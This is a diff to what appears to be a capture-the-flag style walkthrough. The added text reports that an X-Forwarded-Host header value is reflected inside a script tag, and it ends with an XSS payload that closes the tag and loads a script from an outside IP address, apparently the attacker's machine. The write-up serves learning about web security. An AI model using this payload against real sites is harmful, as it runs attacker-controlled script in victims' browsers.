@@ -461,9 +461,9 @@ Analyzing the server response, we can see an interesting piece of code:
 
 <br />
 
-Apparently, the website is making a request to `http://static/js/lib.js?utm_source=http://internal-proxy.local`.
+Apparently, the website is making a request to `/static/js/lib.js`, passing the `utm_source` parameter with the value `http://internal-proxy.local`
 
-Next step is to discover where the website is looking for the `utm_source` parameter value `(http://internal-proxy.local)`. 
+Next step is to discover where the website is looking for the `utm_source` value. 
 
 There are several possibilities, but trying to control this value with a header like `X-Forwarded-Host` makes more sense to me.
 
@@ -474,3 +474,21 @@ So let's try to add the `X-Forwarded-Host: test` header to our request:
 ![13](../../../assets/images/Caption/13.png)
 
 <br />
+
+We did it! Our input was reflected in the output!
+
+This opens the door to a lof of vulnerabilities, the most obvious being `XSS`, because we're injecting our input inside `HTML` tags.
+
+If we escape these tags, we may be able to execute `JavaScript` code.
+
+To test this, we will use the following payload:
+
+<br />
+
+```bash
+"></script><script src="http://10.10.14.13/"><"
+```
+
+
+
+
